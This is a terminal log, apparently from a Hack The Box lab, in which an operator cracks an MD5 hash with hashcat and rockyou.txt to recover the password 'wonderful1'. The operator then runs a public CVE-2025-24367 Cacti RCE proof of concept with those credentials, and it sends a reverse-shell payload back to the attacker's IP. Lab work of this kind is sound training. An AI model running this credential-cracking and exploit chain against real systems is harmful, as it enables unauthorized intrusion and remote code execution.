No hashes loaded.

Started: Wed Feb 25 04:48:07 2026
Stopped: Wed Feb 25 04:48:08 2026
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ hashcat -m 1110 hashmonster.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v7.1.2) starting

Either the specified hash mode does not exist in the official repository,
or the file(s) could not be found. Please check that the hash mode number is
correct and that the files are in the correct place.

/usr/share/hashcat/modules/module_01110.so: cannot open shared object file: No such file or directory

Started: Wed Feb 25 04:48:16 2026
Stopped: Wed Feb 25 04:48:16 2026
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ hashcat -m 1210 hashmonster.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v7.1.2) starting

Either the specified hash mode does not exist in the official repository,
or the file(s) could not be found. Please check that the hash mode number is
correct and that the files are in the correct place.

/usr/share/hashcat/modules/module_01210.so: cannot open shared object file: No such file or directory

Started: Wed Feb 25 04:48:24 2026
Stopped: Wed Feb 25 04:48:24 2026
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ hashcat -m 1310 hashmonster.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-Intel(R) Core(TM) i5-10300H CPU @ 2.50GHz, 1845/3691 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashfile 'hashmonster.txt' on line 1 (56b32eb43e6f15395f6c46c1c9e1cd36): Token length exception

* Token length exception: 1/1 hashes
  This error happens if the wrong hash type is specified, if the hashes are
  malformed, or if input is otherwise not as expected (for example, if the
  --username or --dynamic-x option is used but no username or dynamic-tag is present)

No hashes loaded.

Started: Wed Feb 25 04:48:32 2026
Stopped: Wed Feb 25 04:48:32 2026
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ hashid 56b32eb43e6f15395f6c46c1c9e1cd36

Analyzing '56b32eb43e6f15395f6c46c1c9e1cd36'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ hashcat -m 0 -a 0 hashmonster.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-Intel(R) Core(TM) i5-10300H CPU @ 2.50GHz, 1845/3691 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Initializing backend runtime for device #1. Please be patient...
Host memory allocated for this attack: 512 MB (1511 MB free)




Dictionary cache hit:
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

56b32eb43e6f15395f6c46c1c9e1cd36:wonderful1               
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 56b32eb43e6f15395f6c46c1c9e1cd36
Time.Started.....: Wed Feb 25 04:50:57 2026 (0 secs)
Time.Estimated...: Wed Feb 25 04:50:57 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   446.3 kH/s (0.42ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 18432/14344384 (0.13%)
Rejected.........: 0/18432 (0.00%)
Restore.Point....: 16384/14344384 (0.11%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: chatty -> sweetgurl
Hardware.Mon.#01.: Util: 53%

Started: Wed Feb 25 04:50:33 2026
Stopped: Wed Feb 25 04:50:58 2026
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
Cloning into 'CVE-2025-24367-Cacti-PoC'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 9 (delta 1), reused 2 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), 6.63 KiB | 6.63 MiB/s, done.
Resolving deltas: 100% (1/1), done.
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ cd CVE-2025-24367-Cacti-PoC 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/CVE-2025-24367-Cacti-PoC]
└─$ ls
exploit.py  README.md
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/CVE-2025-24367-Cacti-PoC]
└─$ python exploit.py -u marcus -p wonderful1 -url
usage: CVE-2025-24367 - Cacti Authenticated Graph Template RCE [-h] -u USER -p PASSWORD -i IP -l PORT -url URL [--proxy]
CVE-2025-24367 - Cacti Authenticated Graph Template RCE: error: argument -url/--url: expected one argument
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/CVE-2025-24367-Cacti-PoC]
└─$ python exploit.py -u marcus -p wonderful1 -url http://cacti.monitorsfour.htb -i $attackerIp -l 60001
usage: CVE-2025-24367 - Cacti Authenticated Graph Template RCE [-h] -u USER -p PASSWORD -i IP -l PORT -url URL [--proxy]
CVE-2025-24367 - Cacti Authenticated Graph Template RCE: error: argument -i/--ip: expected one argument
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/CVE-2025-24367-Cacti-PoC]
└─$ python exploit.py -u marcus -p wonderful1 -url http://cacti.monitorsfour.htb -i 10.10.16.67 -l 60001
[+] Cacti Instance Found!
[+] Serving HTTP on port 80
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: LAUvm.php
[+] Got payload: /bash
[i] Created PHP filename: PLg62.php
[+] Hit timeout, looks good for shell, check your listener!
[+] Stopped HTTP server on port 80
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/CVE-2025-24367-Cacti-PoC]
└─$ 



